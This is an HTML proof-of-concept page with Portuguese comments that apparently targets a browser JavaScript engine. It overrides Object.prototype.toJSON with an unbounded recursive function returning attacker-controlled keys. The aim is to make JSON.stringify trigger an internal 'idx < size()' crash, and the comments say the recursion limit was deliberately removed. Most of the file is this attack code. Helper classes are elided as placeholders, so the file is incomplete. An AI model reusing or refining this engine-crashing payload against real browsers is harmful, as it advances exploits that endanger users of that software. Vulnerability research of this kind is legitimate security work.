<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>PoC Isolado v2.3t - Controlando Chaves na Recursão</title>
    <style> /* ... estilos como antes ... */ </style>
</head>
<body>
    <h1>PoC Isolado v2.3t - Controlando Chaves na Recursão</h1>
    <p>Tenta acionar o crash idx < size() controlando as chaves na recursão. FOCO NO CONSOLE.</p>
    <button id="runBtn" onclick="runIsolatedTest()">Iniciar Teste v2.3t</button>
    <div id="output"></div>

    <script>
        // AdvancedInt64 e generalUtils como antes...
        class AdvancedInt64 { /* ... (código completo como antes) ... */ }
        const generalUtils = { /* ... (código completo como antes) ... */ };

        const outputDivS1 = document.getElementById('output');
        const runBtn = document.getElementById('runBtn');    
        const MEDIUM_PAUSE_S1 = 200;

        const logS1 = (message, type = 'info', funcName = '') => {
            console.log(`[${type.toUpperCase()}] ${funcName ? '['+funcName+'] ' : ''}${message}`);
            const targetDiv = document.getElementById('output');
            if (targetDiv) { try { const timestamp = `[${new Date().toLocaleTimeString()}]`; const prefix = funcName ? `[${funcName}] ` : ''; const sanitizedMessage = String(message).replace(/</g, "&lt;").replace(/>/g, "&gt;"); const logClass = ['info', 'test', 'subtest', 'vuln', 'good', 'warn', 'error', 'leak', 'ptr', 'critical', 'escalation'].includes(type) ? type : 'info'; if(targetDiv.innerHTML.length > 300000){ targetDiv.innerHTML = targetDiv.innerHTML.substring(targetDiv.innerHTML.length - 150000); targetDiv.innerHTML = `<span>[Log Truncado...]</span>\n` + targetDiv.innerHTML; } targetDiv.innerHTML += `<span class="log-${logClass}">${timestamp} ${prefix}${sanitizedMessage}\n</span>`; targetDiv.scrollTop = targetDiv.scrollHeight; } catch(e) { console.error(`Erro DENTRO de logS1 (para div):`, e); }}
        };
        const PAUSE_S1_FUNC = (ms = 10) => new Promise(r => setTimeout(r, ms));
        
        const testObject_t = { p1_t: "val_t1", p2_t: "val_t2" }; // Objeto raiz simples
        let callCount_toJSON_t = 0;
        let originalToJSON_Descriptor_t;
        const ppKey_t = 'toJSON';

        // String para usar nas chaves recursivas - tente variar o comprimento
        const RECURSIVE_KEY_STRING_BASE = "RECURSIVE_KEY_"; 
        // Tente com strings bem longas para ver se força o idx < size() mais rápido
        // const RECURSIVE_KEY_STRING_BASE = "L".repeat(1000) + "_"; 


        function setupPrototypePollution_t() {
            callCount_toJSON_t = 0;
            originalToJSON_Descriptor_t = Object.getOwnPropertyDescriptor(Object.prototype, ppKey_t);

            Object.prototype[ppKey_t] = function() { 
                callCount_toJSON_t++;
                let logPrefix = `toJSON PoC v2.3t (Call ${callCount_toJSON_t})`;
                
                let thisIdentifier = "unknown_this_t";
                if (this === testObject_t) thisIdentifier = "ROOT_T";
                else if (Array.isArray(this)) thisIdentifier = "ARRAY_T";
                else if (this && typeof this === 'object' && this.hasOwnProperty('level_t')) thisIdentifier = `PREV_RETURN_OBJ_L${this.level_t}_T`;

                console.log(`%c${logPrefix} - INVOKED! id='${thisIdentifier}', typeof='${typeof this}', constructor='${this && this.constructor ? this.constructor.name : 'N/A'}'`, "background: #1e1e1e; color: #00ffff");
                // console.dir(this); // Cuidado com objetos grandes

                // Removido o limite de recursão para tentar atingir o crash idx < size()
                // if (callCount_toJSON_t > 10) { ... } 

                let keys = [];
                try {
                    console.log(`%c${logPrefix} - PRESTES a chamar Object.keys(this) para id='${thisIdentifier}'`, "color:red; font-weight:bold;");
                    keys = Object.keys(this); 
                    console.log(`%c${logPrefix} - Object.keys(this) SUCESSO para id='${thisIdentifier}'. Keys Original:`, "color:green", keys);
                    
                    let keysToUseInReturn;
                    if (thisIdentifier === "ROOT_T") {
                        keysToUseInReturn = keys; // Usa as chaves originais do objeto raiz
                    } else {
                        // Para chamadas recursivas (quando 'this' é um array ou um objeto retornado anteriormente),
                        // vamos usar chaves customizadas baseadas nos índices do array 'keys' (que são '0', '1', etc.)
                        // ou nas chaves do PREV_RETURN_OBJ_R.
                        keysToUseInReturn = keys.map((key, index) => `${RECURSIVE_KEY_STRING_BASE}${callCount_toJSON_t}_${index}`);
                        console.log(`%c${logPrefix} - Novas chaves para retorno (id='${thisIdentifier}'):`, "color:orange", keysToUseInReturn);
                    }
                    
                    logS1(`${logPrefix} - Usando chaves no retorno: [${keysToUseInReturn.join(',')}]`, 'good', 'toJSON_t');
                    return { 
                        level_t: callCount_toJSON_t, // Para rastrear a profundidade
                        payload_r_keys: keysToUseInReturn // Chaves potencialmente longas ou controladas
                    };

                } catch (e) {
                    console.error(`${logPrefix} - ERRO em Object.keys(this) para id='${thisIdentifier}':`, e);
                    logS1(`${logPrefix} - ERRO em Object.keys(this) para id='${thisIdentifier}': ${e.message}`, 'error', 'toJSON_t');
                    return { "error_in_toJSON_t": true, "message": String(e.message) };
                }
            };
            logS1("Poluição Object.prototype.toJSON APLICADA (v2.3t - Chaves Controladas na Recursão).", 'good', 'setup_t');
        }

        function cleanupPrototypePollution_t() {
            if (originalToJSON_Descriptor_t) {
                Object.defineProperty(Object.prototype, ppKey_t, originalToJSON_Descriptor_t);
            } else if (Object.prototype.hasOwnProperty(ppKey_t)) {
                delete Object.prototype[ppKey_t];
            }
            logS1("Object.prototype.toJSON restaurado.", 'good', 'cleanup_t');
        }

        async function runIsolatedTest() {
            document.querySelectorAll('button').forEach(b => b.disabled = true);
            if (outputDivS1) outputDivS1.innerHTML = '';
            logS1(`==== INICIANDO PoC Isolado v2.3t (Chaves Controladas na Recursão - CRASH idx < size() ESPERADO?) ====`, 'test', 'runTest_t');

            setupPrototypePollution_t();
            
            logS1(`Tentando JSON.stringify em testObject_t...`, 'critical', 'runTest_t');
            let result_t;
            let errorState = null;
            try {
                result_t = JSON.stringify(testObject_t); 
                logS1(`JSON.stringify CONCLUÍDO (INESPERADO SE O CRASH DEVERIA OCORRER!). Resultado: ${result_t ? String(result_t).substring(0, 300) : "N/A"}`, 'warn', 'runTest_t');
            } catch (e) {
                errorState = e;
                logS1(`ERRO CAPTURADO por JSON.stringify: ${e.message}`, 'error', 'runTest_t');
                if (e.stack) logS1(`Stack: ${e.stack}`, 'error', 'runTest_t');
                console.error("ERRO durante JSON.stringify em runTest_t:", e);
            } finally {
                logS1("Entrou no finally de runTest_t.", 'info', 'runTest_t');
                cleanupPrototypePollution_t();
            }
            
            await PAUSE_S1_FUNC(MEDIUM_PAUSE_S1);
            if (errorState && errorState.toString().includes("Maximum call stack size exceeded")) {
                 logS1(`\n==== PoC Isolado v2.3t CONCLUÍDO com ESTOURO DE PILHA (Chamadas toJSON: ${callCount_toJSON_t}) ====`, 'error', 'runTest_t');
            } else if (!result_t && !errorState) {
                 logS1(`\n==== PoC Isolado v2.3t CONCLUÍDO mas TRAVOU SEM ERRO CAPTURÁVEL (Chamadas toJSON: ${callCount_toJSON_t}) ====`, 'warn', 'runTest_t');
            } else {
                 logS1(`\n==== PoC Isolado v2.3t CONCLUÍDO (Chamadas toJSON: ${callCount_toJSON_t}) ====`, 'test', 'runTest_t');
            }
            document.querySelectorAll('button').forEach(b => b.disabled = false);
        }
    </script>
</body>
</html>
